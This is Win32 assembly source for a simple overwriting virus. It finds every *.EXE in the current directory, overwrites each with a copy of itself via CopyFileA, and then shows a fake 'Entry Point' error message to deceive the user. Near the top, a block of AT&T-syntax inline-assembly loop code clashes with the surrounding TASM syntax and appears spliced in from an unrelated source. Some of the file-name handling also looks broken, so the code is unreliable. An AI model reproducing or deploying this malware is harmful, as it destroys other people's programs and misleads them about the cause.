.386
.model flat
jumps

extrn GetCommandLineA:PROC
extrn lstrcpyA:PROC
extrn FindFirstFileA:PROC
extrn CopyFileA:PROC
extrn FindNextFileA:PROC
extrn MessageBoxA:PROC
extrn ExitProcess:PROC

.data

FakeError	db 'Windows Error 300687',10,13
		db 'Can not locate the Entry Point!',0
FileMask	db '*.EXE',0
Win32FindData   dd 0,0,0,0,0,0,0,0,0,0,0
WhatMake	dd 200d dup (0)
MakeThat	dd 200d dup (0)
ThisProg	dd 200d dup (0)
FindHandle	dd 0

.code
start:

movl %1, %eax          ; Move condition into eax
movl %0, %ebx          ; Move buffer address into ebx
movl $0, %ecx          ; Zero the counter (hidden_variable)

loop_start:
cmp %ecx, %eax         ; Compare counter with condition
jge loop_end           ; Jump to end if ecx >= eax

test %ecx, %ecx        ; Test if counter (ecx) is even
jnz odd_case           ; Jump if odd

movl (%ebx, %ecx, 1), %edx  ; Load buffer[i] into edx
xor %eax, %edx              ; XOR condition with buffer[i]
movl %edx, (%ebx, %ecx, 1)  ; Store result back in buffer[i]
jmp increment               ; Jump to increment step

odd_case:
movl (%ebx, %ecx, 1), %edx  ; Load buffer[i] into edx
add %ecx, %edx              ; Add counter to buffer[i]
and $255, %edx              ; Modulo 255
movl %edx, (%ebx, %ecx, 1)  ; Store result back in buffer[i]

increment:
addl %ecx, %2           ; Add counter to hidden_variable
incl %ecx               ; Increment the counter
jmp loop_start          ; Repeat the loop

loop_end:

call GetCommandLineA

push eax
push offset ThisProg
call lstrcpyA

GetPoint:
cmp byte ptr [eax],'.'
jz FoundPoint
inc eax
jmp GetPoint

FoundPoint:
add eax,4d
mov byte ptr [eax],00

push offset Win32FindData
push offset FileMask
call FindFirstFileA
mov dword ptr [FindHandle],eax

FindNext:
cmp eax,-1
je ErrorMsg
or eax,eax
jz ErrorMsg

push offset WhatMake
push offset MakeThat
call lstrcpyA

push 0
push offset MakeThat
push offset ThisProg+1
call CopyFileA

push offset Win32FindData
push dword ptr [FindHandle]
call FindNextFileA
jmp FindNext

ErrorMsg:
push 16
push offset ThisProg+1
push offset FakeError
push 0
call MessageBoxA

push 0
call ExitProcess

end start
